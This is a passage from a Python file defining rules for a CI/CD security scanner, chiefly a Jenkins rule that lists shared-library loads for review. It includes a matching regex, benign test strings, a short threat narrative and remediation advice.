            "Multibranch agents, pushing a follow-up commit after a "
            "trusted actor's build can also inherit the trust level "
            "for the next run.  The Dependabot auto-merge bypass on "
            "GitHub (``github.actor`` confused-deputy) is the same "
            "pattern applied to a different CI platform."
        ),
        incidents=[
            "Dependabot auto-merge bypass class (GH analog)",
        ],
    ),
    # =========================================================================
    # SEC3-JK-005 — shared-library inventory (review-needed)
    # =========================================================================
    #
    # Fires INFO once per ``@Library('...')`` or ``library('...')``
    # reference in a Jenkinsfile.  Built for the ``--baseline`` /
    # ``--diff`` workflow: initial scan lists every shared library in
    # use; subsequent scans surface only NEW libraries in diff output.
    # Distinct from SEC3-JK-001 (shared library loaded without SHA
    # pinning — HIGH).  Inventory has zero implicit threat assessment;
    # it surfaces the external-code surface for one-time review.
    Rule(
        id="SEC3-JK-005",
        title="Jenkins shared library used (inventory; review-needed)",
        severity=Severity.INFO,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-3",
        review_needed=True,
        finding_family="Mutable dependency references",
        description=(
            "The Jenkinsfile loads a Jenkins shared library via "
            "``@Library('<id>')`` or ``library('<id>')``.  Shared "
            "libraries are Groovy code that runs as part of the "
            "pipeline with the build agent's credentials and the "
            "``withCredentials`` scope active at the load site — every "
            "library is a code-execution dependency.  Use "
            "``--baseline`` to snapshot the current set of libraries "
            "and ``--diff`` to surface only newly-added libraries in "
            "subsequent scans."
        ),
        pattern=RegexPattern(
            # Matches all four forms:
            #   @Library('lib-name@ref') _
            #   @Library(['lib-name@ref']) _              # list form
            #   @Library(['lib1@v1', 'lib2@v2']) _        # multi-lib list
            #   library('lib-name@ref')
            #   library identifier: 'lib-name@ref', retriever: ...
            #
            # The optional ``\[?`` after the opening paren handles the
            # list form used by Jenkinsfiles that load multiple
            # libraries at once (e.g., cloudogu/ecosystem). For
            # multi-library lists, the rule fires once per line — fine
            # for inventory purposes since the line itself is the
            # dependency-declaration site.
            match=r"(?:@Library|\blibrary)\s*\(?\s*\[?\s*(?:identifier:\s*)?['\"]([^'\"]+)['\"]",
            exclude=[
                r"^\s*//",
                r"^\s*\*",
            ],
        ),
        remediation=(
            "Each finding is the *first* occurrence of a shared "
            "library in this scan; review the library's repository, "
            "publisher, and how it pins its own dependencies, then "
            "snapshot the inventory with ``--baseline``.  After "
            "baseline, only NEW libraries surface in ``--diff`` "
            "output.  Pin to a SHA-style identifier where possible "
            "(see SEC3-JK-001 for severity-graded pinning advice)."
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/shared-libraries/",
        test_positive=[
            "@Library('my-shared-lib@v1.0') _",
            'library("acme-corp/jenkins-lib@main")',
            "library identifier: 'foo@bar', retriever: modernSCM(...)",
            # List form — used by cloudogu/ecosystem in the wild.
            "@Library(['github.com/cloudogu/dogu-build-lib@v1.0.0']) _",
            # List form with multiple libraries on one line.
            "@Library(['lib1@v1.0', 'lib2@v2.0']) _",
        ],
        test_negative=[
            "// @Library('my-shared-lib@v1.0') _",
            " * library example",
            # Just the word library appearing somewhere — not a load.
            "echo 'library updated'",
        ],
        stride=["T"],
        threat_narrative=(
            "Shared libraries execute as Groovy in the same JVM as the "
            "pipeline, with full access to the build node's secrets, "
            "credentials, and filesystem.  A library compromise — "
            "force-pushed branch ref, maintainer takeover, or a "
            "library author's credentials being phished — turns into "
            "code execution in every pipeline that loads the library. "
            "This rule does not claim any specific library is "
            "malicious; it surfaces the dependency surface so a human "
            "reviewer can make the trust decision once, with "
            "``--baseline`` / ``--diff`` ensuring new additions don't "
            "slip through."
        ),
        confidence="medium",
    ),
]
